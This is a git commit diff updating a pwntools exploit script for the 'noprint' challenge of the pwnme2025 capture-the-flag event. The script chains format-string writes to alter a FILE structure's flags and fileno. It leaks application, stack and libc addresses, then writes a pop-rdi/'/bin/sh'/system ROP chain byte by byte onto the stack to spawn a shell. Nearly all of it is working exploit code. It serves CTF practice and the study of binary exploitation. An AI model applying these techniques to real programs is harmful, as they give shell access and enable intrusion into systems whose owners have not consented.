d7b5927bfd147dab58a599ed7d0827f332cd3db0
thj <thj8@163.com>
2025-05-14 16:55:17 +0800

    update noprint exp

--- tasks/2025/pwnme2025/noprint/exp.py
+++ tasks/2025/pwnme2025/noprint/exp.py
@@ -1,5 +1,4 @@
-from re import I
-from elftools.construct import lib
+from os import fpathconf
 from pwn import *
 
 context.log_level = "debug"
@@ -11,7 +10,7 @@ f_remote = True if "remote" in sys.argv else False
 f_gdb = True if "gdb" in sys.argv else False
 
 vuln_path = "./noprint"
-libc_path = "/root/glibc-all-in-one/libs/2.41-6ubuntu1_amd64/libc.so.6"
+libc_path = "./libc.so.6"
 
 elf, rop = ELF(vuln_path), ROP(vuln_path)
 libc, roplibc = ELF(libc_path), ROP(libc_path)
@@ -33,85 +32,82 @@ def ddebug(b=""):
 # u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
 
 
-new_flags = 0x3e84
+fileno_offset = 112
+new_flag = 0x3e84
+# new flag in file struct
+payload = f"%{new_flag}c%9$hn"
+io.sendlineafter("the void\n", payload)
 
-# change flag ---> 0x3e84
-ddebug("b __vfprintf_internal\n")
-payload = f"%{new_flags}c%9$hn".encode()
-io.sendlineafter("void\n", payload)
-time.sleep(0.5)
-
-# write fileno address to %13$ 9$的值+112->113$
-io.sendline(b"%*9$d%112c%13$n")
-time.sleep(0.5)
-# _fileno-->1
-io.sendline(b"%1c%21$hhn")
-
-payload = b"\n\n"
+# modify fileno 3->1 stdoussss
+sleep(0.1)
+payload = f"%*9$d%{fileno_offset}c%13$n".encode()
 io.sendline(payload)
-io.clean()
-
-# leak libc stack heap
-time.sleep(0.5)
-payload = "%9$p%11$p%12$p%16$p\n\n"
-io.sendline(payload.encode())
-io.recvuntil(b"\x30\x78", drop=True)
-leaks = io.recvuntil(b"\x0a"*2)
+sleep(0.1)
+payload = b"%1c%21$hhn"
+io.sendline(payload)
 
 
-log.hexdump(leaks)
-heap = int(leaks[0:12], 16)
-stack = int(leaks[12:26], 16)
-log.success("stack:-----> " + hex(stack))
-libc.address = int(leaks[26:40], 16) - 0x2a338
+# leak libc, stack
+sleep(0.1)
+payload = b"%16$p--%11$p--%12$p--\n\n"
+io.sendline(payload)
+
+off_16_stack = 0x5580298bb2e4 - 0x5580298ba000
+off_11_stack =  0x7ffcf3fda890 - 0x7ffcf3fbb000
+off_12_libc = 0x7f9ee27893b8 - 0x7f9ee275f000 
+leak_app = int(io.recvuntil("--", drop=True)[-12:], 16) - off_16_stack
+leak_stack = int(io.recvuntil("--", drop=True)[-12:], 16)
+libc.address = int(io.recvuntil("--", drop=True)[-12:], 16) - off_12_libc
+log.success("leak_app:-----> " + hex(leak_app))
+log.success("base_stack:-----> " + hex(leak_stack))
 log.success("libc:-----> " + hex(libc.address))
-noprint = int(leaks[40:54], 16) - 0x12e4
-log.success("pro:-----> " + hex(noprint))
 
-# 
-buffer_ptr = stack-0xa6 & 0xffff
-payload = f"%{buffer_ptr}c%11$hn\n\n"
-io.sendline(payload.encode())
-
-#new_flags = 0x3c84
-payload = b"%15492c%9$hn\n"
+sleep(0.1)
+payload = b"%3c%21$hhn\n\n"
 io.sendline(payload)
 
-io.clean()
-io.clean()
-io.clean()
-sleep(1)
+new_flag = 0x3c84
+# new flag in file struct
+payload = f"%{new_flag}c%9$hn".ljust(0x100, "t")
+io.send(payload)
+sleep(0.1)
 
-payload2 = f"%3c%21$n"
-io.sendline(payload2.encode())
 
-io.clean()
-sleep(1)
+fprint_ret = leak_stack - 0xd8
+sleep(0.5)
 
-io.sendline(f"%{stack>>16}c%31$n".encode())
+"""
+0x00000000000cee4d : pop rdi ; ret
+0x0000000000028a93 : ret
 
-io.clean()
-sleep(1)
+"""
+pop_rdi = libc.address + 0x00000000000cee4d
+binsh = next(libc.search("/bin/sh\x00"))
+# ret = libc.address + 0x0000000000028a93
+ret = leak_app + 0x12e3
+systemaddr = libc.symbols["system"]
 
-buffer_ptr = stack-0xa8 & 0xffff
-payload = f"%{buffer_ptr}c%11$hn\n\n"
-io.sendline(payload.encode())
-io.clean()
-sleep(1)
+io.sendline(f"%{fprint_ret&0xffff}c%11$hn".encode())
+def thj_write(target, val):
+    for i in range(6):
+        d = target + i
+        v = val >> (8*i) & 0xff
+        io.send(f"%{d&0xff}c%11$hhn".encode().ljust(0x100, b"\x00"))
+        io.send(f"%{v&0xff}c%31$hhn".encode().ljust(0x100, b"\x00"))
 
-io.sendline(f"%{(stack-0xd8)&0xffff}c%31$hn".encode())
+thj_write(fprint_ret+8, pop_rdi)
+thj_write(fprint_ret+8*2, binsh)
+thj_write(fprint_ret+8*3, systemaddr)
 
-sleep(1)
-
-binsh = next(libc.search(b"/bin/sh"))
-pop_rdi = 0x11a79c + libc.address
-rop_chain = [pop_rdi+1, pop_rdi, binsh, libc.sym['system']]
-rop_chain = b''.join(map(p64, rop_chain))
-io.sendline(rop_chain)
-
-sleep(1)
-
-#io.sendline("cat flag".encode())
+log.success("pop_rdi:-----> " + hex(pop_rdi))
+log.success("fprint_ret:-----> " + hex(fprint_ret))
+log.success("ret:-----> " + hex(ret))
+sleep(0.1)
+io.sendline(f"%{fprint_ret&0xffff}c%11$hn".encode())
+sleep(0.1)
+# ddebug("breakrva 0x01386\ncontinue")
+ddebug()
+io.sendline(f"%{ret&0xffff}c%31$hn".encode())
 
 io.interactive()
 
